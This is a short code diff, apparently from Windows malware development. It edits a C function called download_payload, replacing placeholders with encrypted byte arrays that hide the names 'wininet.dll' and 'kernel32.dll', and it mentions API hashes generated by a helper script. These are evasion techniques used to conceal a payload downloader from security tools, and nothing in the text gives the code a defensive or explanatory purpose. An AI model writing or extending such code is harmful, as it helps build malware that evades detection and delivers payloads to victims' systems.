@@ -15,8 +15,8 @@ char* download_payload(const char* url, SIZE_T* payload_size) {
     // load key runtime (in stack)
     LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);
     
-    char enc_wininet[] = { /* wininet.dll\0 */ };
-    char enc_kernel32[] = { /* kernel32.dll\0 */ };
+    char enc_wininet[] = { 0x28, 0x1a, 0x1b, 0x19, 0x5d, 0x16, 0x47, 0x4d, 0x16, 0x5f, 0x18, 0x6b };
+    char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
 
     // API hashes
     // NOTE: calculate these using hasher.py
